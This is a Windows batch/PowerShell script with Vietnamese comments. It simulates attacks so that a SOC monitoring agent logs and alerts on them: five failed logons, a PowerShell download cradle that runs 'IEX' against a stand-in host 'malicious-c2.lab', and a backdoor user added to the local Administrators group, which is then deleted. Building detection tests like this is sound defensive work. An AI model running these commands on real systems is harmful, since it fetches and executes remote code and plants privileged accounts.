<# : batch portion
@echo off
setlocal
chcp 65001 >nul
cls

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "iex ((Get-Content -LiteralPath '%~f0') -join [Environment]::NewLine)"

echo.
echo ====================================================================
echo   HOAN TAT KICH BAN MO PHONG TAN CONG!
echo ====================================================================
pause
goto :eof
#>

# ==============================================================================
# PHAN POWERSHELL MO PHONG TAN CONG (DUNG DUY NHAT 1 FILE .BAT NAY)
# ==============================================================================
$ErrorActionPreference = 'SilentlyContinue'

Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host "   KHOI DONG KICH BAN MO PHONG TAN CONG (ATTACK SIMULATION)" -ForegroundColor Cyan
Write-Host "======================================================================" -ForegroundColor Cyan
Write-Host " Script se tao 3 chuoi su kien tan cong dien hinh:" -ForegroundColor White
Write-Host "  1. Do mat khau 5 lan (Event 4625 - Brute-force)" -ForegroundColor White
Write-Host "  2. PowerShell Download Cradle doc hai (Event 4104)" -ForegroundColor White
Write-Host "  3. Tao backdoor user va leo thang Admin (Event 4688)" -ForegroundColor White
Write-Host "----------------------------------------------------------------------" -ForegroundColor Cyan
Write-Host ""

# 1. Mo phong dang nhap sai 5 lan lien tiep
Write-Host "[1/3] Dang tao 5 su kien dang nhap that bai (Brute-force)..." -ForegroundColor Yellow
$secpasswd = ConvertTo-SecureString 'WrongPass123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('fake_hacker_test', $secpasswd)
for ($i = 1; $i -le 5; $i++) {
    Start-Process powershell.exe -Credential $cred -ArgumentList '-NoProfile -Command exit' -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 250
}
Write-Host " [OK] Da tao xong 5 su kien Event 4625." -ForegroundColor Green
Write-Host ""

# 2. Mo phong PowerShell Download Cradle
Write-Host "[2/3] Dang tao su kien PowerShell thuc thi ma doc tu xa (Event 4104)..." -ForegroundColor Yellow
powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.lab/payload.ps1'); whoami /priv; Get-Process | Select-Object -First 3"
Write-Host " [OK] Da tao xong su kien Event 4104." -ForegroundColor Green
Write-Host ""

# 3. Mo phong tao tai khoan va them vao Administrators
Write-Host "[3/3] Dang tao su kien tao User an va leo thang Admin (Event 4688)..." -ForegroundColor Yellow
net user test_attacker_soc P@ssw0rd999! /add
net localgroup Administrators test_attacker_soc /add
Write-Host " [OK] Da tao xong su kien Event 4688." -ForegroundColor Green
Write-Host ""

Write-Host "[*] Dang cho 5 giay de Agent kip quet su kien..." -ForegroundColor Cyan
Start-Sleep -Seconds 5

Write-Host "[*] Dang tu dong don dep user test de giu sach he thong..." -ForegroundColor Cyan
net user test_attacker_soc /delete
Write-Host " [OK] Da don dep hoan tat!" -ForegroundColor Green
Write-Host ""

Write-Host "======================================================================" -ForegroundColor Green
Write-Host "   DA KICH HOAT CHUOI TAN CONG THANH CONG!" -ForegroundColor Green
Write-Host "   Hay quan sat cua so Client Agent va kiem tra Telegram!" -ForegroundColor Yellow
Write-Host "======================================================================" -ForegroundColor Green
